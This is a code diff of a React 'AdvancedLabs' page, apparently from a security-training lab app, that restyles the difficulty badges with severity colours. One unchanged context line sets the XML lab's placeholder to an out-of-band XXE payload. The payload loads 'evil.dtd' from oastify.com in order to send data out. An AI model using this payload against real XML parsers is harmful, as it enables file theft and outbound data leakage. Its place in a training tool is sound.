@@ -99,11 +99,21 @@ export default function AdvancedLabs() {
     (filter.search === '' || lab.name.toLowerCase().includes(filter.search.toLowerCase()))
   );
 
-  const getDifficultyColor = (d) => ({
-    Easy: 'bg-success text-white',
-    Medium: 'bg-warning text-dark',
-    Hard: 'bg-danger text-white'
-  })[d] || 'bg-secondary text-white';
+  // === CORES IGUAIS AO DASHBOARD (severityColors) ===
+  const severityColors = {
+    "Crítico": { bg: "#dc2626", text: "#ffffff" },
+    "Alta": { bg: "#f59e0b", text: "#1f2937" },
+    "Média": { bg: "#0ea5e9", text: "#ffffff" },
+    "Baixa": { bg: "#6b7280", text: "#ffffff" },
+    "Hard": { bg: "#dc2626", text: "#ffffff" },     // ← Hard = Crítico
+    "Medium": { bg: "#f59e0b", text: "#1f2937" },   // ← Medium = Alta
+    "Easy": { bg: "#0ea5e9", text: "#ffffff" }     // ← Easy = Média
+  };
+
+  const getDifficultyColor = (d) => {
+    const color = severityColors[d] || severityColors["Baixa"];
+    return `bg-[${color.bg}] text-[${color.text}]`;
+  };
 
   const placeholder = selected.type === 'xml'
     ? `<?xml version="1.0"?>\n<!DOCTYPE x [<!ENTITY % r SYSTEM "http://oastify.com/evil.dtd"> %r; ]>\n<x>&send;</x>`
@@ -188,6 +198,7 @@ export default function AdvancedLabs() {
                   filteredLabs.map(lab => {
                     const active = selected.id === lab.id;
                     const completed = completedLabs.includes(lab.id);
+                    const color = severityColors[lab.difficulty] || severityColors["Baixa"];
                     return (
                       <motion.button
                         key={lab.id}
@@ -205,7 +216,15 @@ export default function AdvancedLabs() {
                         </div>
                         <div className="d-flex justify-content-between align-items-center mt-1">
                           <small className="text-muted text-truncate me-2">{lab.hint}</small>
-                          <span className={`badge rounded-pill ${getDifficultyColor(lab.difficulty)}`}>{lab.difficulty}</span>
+                          <span 
+                            className="badge rounded-pill small"
+                            style={{ 
+                              backgroundColor: color.bg, 
+                              color: color.text 
+                            }}
+                          >
+                            {lab.difficulty}
+                          </span>
                         </div>
                       </motion.button>
                     );
@@ -225,7 +244,15 @@ export default function AdvancedLabs() {
                   <p className="text-muted small mb-2">{selected.hint}</p>
                   <div className="d-flex flex-wrap gap-2">
                     <span className="badge rounded-pill bg-secondary small">/api/vulnerabilities/test</span>
-                    <span className={`badge rounded-pill ${getDifficultyColor(selected.difficulty)} small`}>{selected.difficulty}</span>
+                    <span 
+                      className="badge rounded-pill small"
+                      style={{ 
+                        backgroundColor: severityColors[selected.difficulty]?.bg || '#6b7280', 
+                        color: severityColors[selected.difficulty]?.text || '#ffffff' 
+                      }}
+                    >
+                      {selected.difficulty}
+                    </span>
                   </div>
                 </div>
                 <div className="d-flex gap-2">
